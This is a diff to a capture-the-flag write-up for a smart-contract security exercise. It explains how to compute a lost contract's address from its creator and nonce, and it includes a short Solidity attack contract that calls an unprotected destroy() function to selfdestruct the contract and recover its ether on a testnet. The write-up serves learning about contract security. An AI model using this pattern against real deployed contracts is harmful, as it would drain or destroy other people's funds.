@@ -53,18 +53,23 @@ Challenge's message:
 
 > A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.
 
+This challenge is quite easy. Basically, the Recovery contract generates a token with the bits of help of the SimpleToken contract. The important thing about the SimpleToken contract is it has a **destroy()** function which selfdestruct the contract addresses. 
+
 
 ## Contract Address Calculating
 
+The address for an Ethereum contract is deterministically computed from the address of its creator (sender) and how many transactions the creator has sent (nonce). The sender and nonce are RLP encoded and then hashed with Keccak-256. Here is an example calculator code in Solidity.
 
 ```solidity
 bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
 address addr = address(uint160(uint256(hash)));
 ```
 
-More about [this topic.](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed)
+First, it finds the hash and computed the contract address. More about [this topic.](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed)
 
 # Subverting
+
+The only thing we must to do is calculate lost contract's address and selfdestruct it. Here is our short attack contract.
 
 ```solidity
 pragma solidity ^0.8.20;
@@ -79,7 +84,7 @@ contract Attack{
     constructor(address payable _challenge){
         bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _challenge, bytes1(0x01)));
         addr = address(uint160(uint256(hash)));
-        target = SimpleToken(addr);
+        target = SimpleToken(payable(addr));
     }
 
     function attack()external{
@@ -88,6 +93,9 @@ contract Attack{
 
 }
 ```
+
+Deploy the attack contract with target contract's address. See the transaction on [etherscan.](https://sepolia.etherscan.io/tx/0x0e33934f10ffdc3871d13cf4f9d743f320c1e9c57a89a58145482b1d05990d8b)
+
 
 
 <p align="center"><img src=""></p>
